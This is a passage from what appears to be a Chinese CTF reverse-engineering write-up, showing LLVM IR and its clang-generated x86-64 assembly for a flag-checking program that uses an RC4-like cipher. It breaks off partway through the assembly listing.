%71 = add nsw i32 %64, %70</span><br><span class="line">  %72 = and i32 %71, 255</span><br><span class="line">  %73 = sext i32 %72 to i64</span><br><span class="line">  %74 = getelementptr inbounds i8, ptr %58, i64 %73</span><br><span class="line">  %75 = load i8, ptr %74, align 1</span><br><span class="line">  %76 = zext i8 %75 to i32</span><br><span class="line">  %77 = load i8, ptr %9, align 1</span><br><span class="line">  %78 = zext i8 %77 to i32</span><br><span class="line">  %79 = add nsw i32 %76, %78</span><br><span class="line">  %80 = and i32 %79, 255</span><br><span class="line">  %81 = trunc i32 %80 to i8</span><br><span class="line">  store i8 %81, ptr %13, align 1</span><br><span class="line">  %82 = load ptr, ptr %5, align 8</span><br><span class="line">  %83 = load i8, ptr %13, align 1</span><br><span class="line">  %84 = zext i8 %83 to i64</span><br><span class="line">  %85 = getelementptr inbounds i8, ptr %82, i64 %84</span><br><span class="line">  %86 = load i8, ptr %85, align 1</span><br><span class="line">  store i8 %86, ptr %14, align 1</span><br><span class="line">  %87 = load ptr, ptr %6, align 8</span><br><span class="line">  %88 = load i64, ptr %11, align 8</span><br><span class="line">  %89 = getelementptr inbounds i8, ptr %87, i64 %88</span><br><span class="line">  %90 = load i8, ptr %89, align 1</span><br><span class="line">  %91 = zext i8 %90 to i32</span><br><span class="line">  %92 = load i8, ptr %14, align 1</span><br><span class="line">  %93 = zext i8 %92 to i32</span><br><span class="line">  %94 = xor i32 %91, %93</span><br><span class="line">  %95 = trunc i32 %94 to i8</span><br><span class="line">  %96 = load ptr, ptr %7, align 8</span><br><span class="line">  %97 = load i64, ptr %11, align 8</span><br><span class="line">  %98 = getelementptr inbounds i8, ptr %96, i64 %97</span><br><span class="line">  store i8 %95, ptr %98, align 1</span><br><span class="line">  br label %99</span><br><span class="line"></span><br><span class="line">99:                                               ; preds = %19</span><br><span class="line">  %100 = load i64, ptr %11, align 8</span><br><span class="line">  %101 = add i64 %100, 1</span><br><span class="line">  store i64 %101, ptr %11, align 8</span><br><span class="line">  br label %15, !llvm.loop !10</span><br><span class="line"></span><br><span class="line">102:                                              ; preds = %15</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i32 @printf(ptr noundef, ...) #2</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind willreturn memory(read)</span><br><span class="line">declare i32 @memcmp(ptr noundef, ptr noundef, i64 noundef) #3</span><br><span class="line"></span><br><span class="line">; Function Attrs: nocallback nofree nounwind willreturn memory(argmem: readwrite)</span><br><span class="line">declare void @llvm.memcpy.p0.p0.i64(ptr noalias nocapture writeonly, ptr noalias nocapture readonly, i64, i1 immarg) #4</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;=&quot;all&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #1 = &#123; nounwind &quot;frame-pointer&quot;=&quot;all&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #2 = &#123; &quot;frame-pointer&quot;=&quot;all&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #3 = &#123; nounwind willreturn memory(read) &quot;frame-pointer&quot;=&quot;all&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #4 = &#123; nocallback nofree nounwind willreturn memory(argmem: readwrite) &#125;</span><br><span class="line">attributes #5 = &#123; nounwind &#125;</span><br><span class="line">attributes #6 = &#123; nounwind willreturn memory(read) &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0, !1, !2, !3, !4&#125;</span><br><span class="line">!llvm.ident = !&#123;!5&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;i32 8, !&quot;PIC Level&quot;, i32 2&#125;</span><br><span class="line">!2 = !&#123;i32 7, !&quot;PIE Level&quot;, i32 2&#125;</span><br><span class="line">!3 = !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;</span><br><span class="line">!4 = !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;</span><br><span class="line">!5 = !&#123;!&quot;Ubuntu clang version 14.0.0-1ubuntu1.1&quot;&#125;</span><br><span class="line">!6 = distinct !&#123;!6, !7&#125;</span><br><span class="line">!7 = !&#123;!&quot;llvm.loop.mustprogress&quot;&#125;</span><br><span class="line">!8 = distinct !&#123;!8, !7&#125;</span><br><span class="line">!9 = distinct !&#123;!9, !7&#125;</span><br><span class="line">!10 = distinct !&#123;!10, !7&#125;</span><br></pre></td></tr></table></figure>
<p>以上抽象东西请大佬自行享用。我还是干点人事：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -S a.bc -o a.s</span><br></pre></td></tr></table></figure>
<p>即用<code>clang</code>反汇编得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">        .file   &quot;ab.c&quot;</span><br><span class="line">        .globl  main                            # -- Begin function main</span><br><span class="line">        .p2align        4, 0x90</span><br><span class="line">        .type   main,@function</span><br><span class="line">main:                                   # @main</span><br><span class="line">        .cfi_startproc</span><br><span class="line"># %bb.0:</span><br><span class="line">        pushq   %rbp</span><br><span class="line">        .cfi_def_cfa_offset 16</span><br><span class="line">        .cfi_offset %rbp, -16</span><br><span class="line">        movq    %rsp, %rbp</span><br><span class="line">        .cfi_def_cfa_register %rbp</span><br><span class="line">        subq    $336, %rsp                      # imm = 0x150</span><br><span class="line">        movl    $0, -4(%rbp)</span><br><span class="line">        movq    $1024, -16(%rbp)                # imm = 0x400</span><br><span class="line">        movq    $0, -24(%rbp)</span><br><span class="line">        movq    -16(%rbp), %rdi</span><br><span class="line">        callq   malloc@PLT</span><br><span class="line">        movq    %rax, -32(%rbp)</span><br><span class="line">        cmpq    $0, -32(%rbp)</span><br><span class="line">        jne     .LBB0_2</span><br><span class="line"># %bb.1:</span><br><span class="line">        movq    stderr@GOTPCREL(%rip), %rax</span><br><span class="line">        movq    (%rax), %rdi</span><br><span class="line">        leaq    .L.str(%rip), %rsi</span><br><span class="line">        movb    $0, %al</span><br><span class="line">        callq   fprintf@PLT</span><br><span class="line">        movl    $1, -4(%rbp)</span><br><span class="line">        jmp     .LBB0_21</span><br><span class="line">.LBB0_2:</span><br><span class="line">        jmp     .LBB0_3</span><br><span class="line">.LBB0_3:                                # =&gt;This Inner Loop Header: Depth=1</span><br><span class="line">        callq   getchar@PLT</span><br><span class="line">        movl    %eax, -36(%rbp)</span><br><span class="line">        cmpl    $10, %eax</span><br><span class="line">        je      .LBB0_9</span><br><span class="line"># %bb.4:                                #   in Loop: Header=BB0_3 Depth=1</span><br><span class="line">        movq    -24(%rbp), %rax</span><br><span class="line">        cmpq    -16(%rbp), %rax</span><br><span class="line">        jne     .LBB0_8</span><br><span class="line"># %bb.5:                                #   in Loop: Header=BB0_3 Depth=1</span><br><span class="line">        movq    -16(%rbp), %rax</span><br><span class="line">        shlq    %rax</span><br><span class="line">        movq    %rax, -16(%rbp)</span><br><span class="line">        movq    -32(%rbp), %rdi</span><br><span class="line">        movq    -16(%rbp), %rsi</span><br><span class="line">        callq   realloc@PLT</span><br><span class="line">        movq    %rax, -48(%rbp)</span><br><span class="line">        cmpq    $0, -48(%rbp)</span><br><span class="line">        jne     .LBB0_7</span><br><span class="line"># %bb.6:</span><br><span class="line">        movq    -32(%rbp), %rdi</span><br><span class="line">        callq   free@PLT</span><br><span class="line">        movq    stderr@GOTPCREL(%rip), %rax</span><br><span class="line">        movq    (%rax), %rdi</span><br><span class="line">        leaq    .L.str.1(%rip), %rsi</span><br><span class="line">        movb    $0, %al</span><br><span class="line">        callq   fprintf@PLT</span><br><span class="line">        movl    $1, -4(%rbp)</span><br><span class="line">        jmp     .LBB0_21</span><br><span class="line">.LBB0_7:                                #   in Loop: Header=BB0_3 Depth=1</span><br><span class="line">        movq    -48(%rbp), %rax</span><br><span class="line">        movq    %rax, -32(%rbp)</span><br><span class="line">.LBB0_8:                                #   in Loop: Header=BB0_3 Depth=1</span><br><span class="line">        movl    -36(%rbp), %eax</span><br><span class="line">        movb    %al, %dl</span><br><span class="line">        movq    -32(%rbp), %rax</span><br><span class="line">        movq    -24(%rbp), %rcx</span><br><span class="line">        movq    %rcx, %rsi</span><br><span class="line">        addq    $1, %rsi</span><br><span class="line">        movq    %rsi, -24(%rbp)</span><br><span class="line">        movb    %dl, (%rax,%rcx)</span><br><span class="line">        jmp     .LBB0_3</span><br><span class="line">.LBB0_9:</span><br><span class="line">        movq    -24(%rbp), %rax</span><br><span class="line">        addq    $10, %rax</span><br><span class="line">        movq    %rax, -56(%rbp)</span><br><span class="line">        movq    -56(%rbp), %rdi</span><br><span class="line">        callq   malloc@PLT</span><br><span class="line">        movq    %rax, -64(%rbp)</span><br><span class="line">        cmpq    $0, -64(%rbp)</span><br><span class="line">        jne     .LBB0_11</span><br><span class="line"># %bb.10:</span><br><span class="line">        movq    -32(%rbp), %rdi</span><br><span class="line">        callq   free@PLT</span><br><span class="line">        movq    stderr@GOTPCREL(%rip), %rax</span><br><span class="line">        movq    (%rax), %rdi</span><br><span class="line">        leaq    .L.str(%rip), %rsi</span><br><span class="line">        movb    $0, %al</span><br><span class="line">        callq   fprintf@PLT</span><br><span class="line">        movl    $1, -4(%rbp)</span><br><span class="line">        jmp     .LBB0_21</span><br><span class="line">.LBB0_11:</span><br><span class="line">        movq    -64(%rbp), %rax</span><br><span class="line">        movq    sub_138(%rip), %rcx</span><br><span class="line">        movq    %rcx, (%rax)</span><br><span class="line">        movw    sub_138+8(%rip), %cx</span><br><span class="line">        movw    %cx, 8(%rax)</span><br><span class="line">        cmpq    $0, -24(%rbp)</span><br><span class="line">        jbe     .LBB0_13</span><br><span class="line"># %bb.12:</span><br><span class="line">        movq    -64(%rbp), %rdi</span><br><span class="line">        addq    $10, %rdi</span><br><span class="line">        movq    -32(%rbp), %rsi</span><br><span class="line">        movq    -24(%rbp), %rdx</span><br><span class="line">        callq   memcpy@PLT</span><br><span class="line">.LBB0_13:</span><br><span class="line">        leaq    -320(%rbp), %rdi</span><br><span class="line">        leaq    sub_b361(%rip), %rsi</span><br><span class="line">        movl    $23, %edx</span><br><span class="line">        callq   sub_2a4c</span><br><span class="line">        movq    -56(%rbp), %rdi</span><br><span class="line">        callq   malloc@PLT</span><br><span class="line">        movq    %rax, -328(%rbp)</span><br><span class="line">        cmpq    $0, -328(%rbp)</span><br><span class="line">        jne     .LBB0_15</span><br><span class="line"># %bb.14:</span><br><span class="line">        movq    -32(%rbp), %rdi</span><br><span class="line">        callq   free@PLT</span><br><span class="line">        movq    -64(%rbp), %rdi</span><br><span class="line">        callq   free@PLT</span><br><span class="line">        movq    stderr@GOTPCREL(%rip), %rax</span><br><span class="line">        movq    (%rax), %rdi</span><br><span class="line">        leaq    .L.str(%rip), %rsi</span><br><span class="line">        movb    $0, %al</span><br><span class="line">        callq   fprintf@PLT</span><br><span class="line">        movl    $1, -4(%rbp)</span><br><span class="line">        jmp     .LBB0_21</span><br><span class="line">.LBB0_15:</span><br><span class="line">        leaq    -320(%rbp), %rdi</span><br><span class="line">        movq    -64(%rbp), %rsi</span><br><span class="line">        movq    -328(%rbp), %rdx</span><br><span class="line">        movq    -56(%rbp), %rcx</span><br><span class="line">        callq   sub_1a4c</span><br><span class="line">        cmpq    $42, -56(%rbp)</span><br><span class="line">        je      .LBB0_17</span><br><span class="line"># %bb.16:</span><br><span class="line">        leaq    .L.str.2(%rip), %rdi</span><br><span class="line">        movb    $0, %al</span><br><span class="line">        callq   printf@PLT</span><br><span class="line">        movq    -32(%rbp), %rdi</span><br><span class="line">        callq   free@PLT</span><br><span class="line">        movq    -64(%rbp), %rdi</span><br><span class="line">        callq   free@PLT</span><br><span class="line">        movq    -328(%rbp), %rdi</span><br><span class="line">        callq   free@PLT</span><br><span class="line">        movl    $0, -4(%rbp)</span><br><span class="line">        jmp     .LBB0_21</span><br><span class="line">.LBB0_17:</span><br><span class="line">        movq    -328(%rbp), %rdi</span><br><span class="line">        leaq    sub_584c(%rip), %rsi</span><br><span class="line">        movl    $42, %edx</span><br><span class="line">        callq   memcmp@PLT</span><br><span class="line">        cmpl    $0, %eax</span><br><span class="line">        jne     .LBB0_19</span><br><span class="line"># %bb.18:</span><br><span class="line">        leaq    .L.str.3(%rip), %rdi</span><br><span class="line">        movb    $0, %al</span><br><span class="line">        callq   printf@PLT</span><br><span class="line">        jmp     .LBB0_20</span><br><span class="line">.LBB0_19:</span><br><span class="line">        leaq    .L.str.4(%rip), %rdi</span><br><span class="line">        movb    $0, %al</span><br><span class="line">        callq   printf@PLT</span><br><span class="line">.LBB0_20:</span><br><span class="line">        movq    -32(%rbp), %rdi</span><br><span class="line">        callq   free@PLT</span><br><span class="line">        movq    -64(%rbp), %rdi</span><br><span class="line">        callq   free@PLT</span><br><span class="line">        movq    -328(%rbp), %rdi</span><br><span class="line">        callq   free@PLT</span><br><span class="line">        movl    $0, -4(%rbp)</span><br><span class="line">.LBB0_21:</span><br><span class="line">        movl    -4(%rbp), %eax</span><br><span class="line">        addq    $336, %rsp                      # imm = 0x150</span><br><span class="line">        popq    %rbp</span><br><span class="line">        .cfi_def_cfa %rsp, 8</span><br><span class="line">        retq</span><br><span class="line">.Lfunc_end0:</span><br><span class="line">        .size   main, .Lfunc_end0-main</span><br><span class="line">        .cfi_endproc</span><br><span class="line">                                        # -- End function</span><br><span class="line">        .p2align        4, 0x90                         # -- Begin function sub_2a4c</span><br><span class="line">        .type   sub_2a4c,@function</span><br><span class="line">sub_2a4c:                               # @sub_2a4c</span><br><span class="line">        .cfi_startproc</span><br><span class="line"># %bb.0:</span><br><span class="line">        pushq   %rbp</span><br><span class="line">        .cfi_def_cfa_offset 16</span><br><span class="line">        .cfi_offset %rbp, -16</span><br><span class="line">        movq    %rsp, %rbp</span><br><span class="line">        .cfi_def_cfa_register %rbp</span><br><span class="line">        movq    %rdi, -8(%rbp)</span><br><span class="line">        movq    %rsi, -16(%rbp)</span><br><span class="line">        movq    %rdx, -24(%rbp)</span><br><span class="line">        movl    $0, -28(%rbp)</span><br><span class="line">.LBB1_1:                                # =&gt;This Inner Loop Header: Depth=1</span><br><span class="line">        cmpl    $256, -28(%rbp)                 # imm = 0x100</span><br><span class="line">        jge     .LBB1_4</span><br><span class="line"># %bb.2:                                #   in Loop: Header=BB1_1 Depth=1</span><br><span class="line">        movl    -28(%rbp), %eax</span><br><span class="line">        movb    %al, %dl</span><br><span class="line">        movq    -8(%rbp), %rax</span><br><span class="line">        movslq  -28(%rbp), %rcx</span><br><span class="line">        movb    %dl, (%rax,%rcx)</span><br><span class="line"># %bb.3:                                #   in Loop: Header=BB1_1 Depth=1</span><br><span class="line">        movl    -28(%rbp), %eax</span><br><span class="line">        addl    $1, %eax</span><br><span class="line">        movl    %eax, -28(%rbp)</span><br><span class="line">        jmp     .LBB1_1</span><br><span class="line">.LBB1_4:</span><br><span class="line">        movb    $0, -29(%rbp)</span><br><span class="line">        movl    $0, -36(%rbp)</span><br><span class="line">.LBB1_5:                                # =&gt;This Inner Loop Header: Depth=1</span><br><span class="line">        cmpl    $256, -36(%rbp)                 # imm = 0x100</span><br><span class="line">        jge     .LBB1_8</span><br><span class="line"># %bb.6:                                #   in Loop: Header=BB1_5 Depth=1</span><br><span class="line">        movq    -16(%rbp), %rax</span><br><span class="line">        movq    %rax, -48(%rbp)                 # 8-byte Spill</span><br><span class="line">        imull   $5, -36(%rbp), %eax</span><br><span class="line">        addl    $3, %eax</span><br><span class="line">        cltq</span><br><span class="line">        xorl    %ecx, %ecx</span><br><span class="line">        movl    %ecx, %edx</span><br><span class="line">        divq    -24(%rbp)</span><br><span class="line">        movq    -48(%rbp), %rax                 # 8-byte Reload</span><br><span class="line">        movb    (%rax,%rdx), %al</span><br><span class="line">        movb    %al, -37(%rbp)</span><br><span class="line">        movzbl  -29(%rbp), %eax</span><br><span class="line">        movq    -8(%rbp), %rcx</span><br><span class="line">        movslq  -36(%rbp), %rdx</span><br><span class="line">        movzbl  (%rcx,%rdx), %ecx</span><br><span class="line">        addl    %ecx, %eax</span><br><span class="line">        movzbl  -37(%rbp), %ecx</span><br><span class="line">        addl    %ecx, %eax</span><br><span class="line">        andl    $255, %eax</span><br><span class="line">                                        # kill: def $al killed $al killed $eax</span><br><span class="line">        movb    %al, -29(%rbp)</span><br><span class="line">        movq    -8(%rbp), %rax</span><br><span class="line">        movslq  -36(%rbp), %rcx</span><br><span class="line">        movb    (%rax,%rcx), %al</span><br><span class="line">        movb    %al, -38(%rbp)</span><br><span class="line">        movq    -8(%rbp), %rax</span><br><span class="line">        movzbl  -29(%rbp), %ecx</span><br><span class="line">                                        # kill: def $rcx killed $ecx</span><br><span class="line">        movb    (%rax,%rcx), %dl</span><br><span class="line">        movq    -8(%rbp), %rax</span><br><span class="line">        movslq  -36(%rbp), %rcx</span><br><span class="line">        movb    %dl, (%rax,%rcx)</span><br><span class="line">        movb    -38(%rbp), %dl</span><br><span class="line">        movq    -8(%rbp), %rax</span><br><span class="line">        movzbl  -29(%rbp), %ecx</span><br><span class="line">                                        # kill: def $rcx killed $ecx</span><br><span class="line">        movb    %dl, (%rax,%rcx)</span><br><span class="line">        movzbl  -29(%rbp), %eax</span><br><span class="line">        addl    -36(%rbp), %eax</span><br><span class="line">        andl    $255, %eax</span><br><span class="line">                                        # kill: def $al killed $al killed $eax</span><br><span class="line">        movb    %al, -29(%rbp)</span><br><span class="line"># %bb.7:                                #   in Loop: Header=BB1_5 Depth=1</span><br><span class="line">        movl    -36(%rbp), %eax</span><br><span class="line">        addl    $1, %eax</span><br><span class="line">        movl    %eax, -36(%rbp)</span><br><span class="line">        jmp     .LBB1_5</span><br><span class="line">.LBB1_8:</span><br><span class="line">        popq    %rbp</span><br><span class="line">        .cfi_def_cfa %rsp, 8</span><br><span class="line">        retq</span><br><span class="line">.Lfunc_end1:</span><br><span class="line">        .size   sub_2a4c, .Lfunc_end1-sub_2a4c</span><br><span class="line">        .cfi_endproc</span><br><span class="line">                                        # -- End function</span><br><span class="line">        .p2align        4, 0x90                         # -- Begin function sub_1a4c</span><br><span class="line">        .type   sub_1a4c,@function</span><br><span class="line">sub_1a4c:                               # @sub_1a4c</span><br><span class="line">        .cfi_startproc</span><br><span class="line"># %bb.0:</span><br><span class="line">        pushq   %rbp</span><br><span class="line">        .cfi_def_cfa_offset 16</span><br><span class="line">        .cfi_offset %rbp, -16</span><br><span class="line">        movq    %rsp, %rbp</span><br><span class="line">        .cfi_def_cfa_register %rbp</span><br><span class="line">        movq    %rdi, -8(%rbp)</span><br><span class="line">        movq    %rsi, -16(%rbp)</span><br><span class="line">        movq    %rdx, -24(%rbp)</span><br><span class="line">        movq    %rcx, -32(%rbp)</span><br><span class="line">        movb    $0, -33(%rbp)</span><br><span class="line">        movb    $0, -34(%rbp)</span><br><span class="line">        movq    $0, 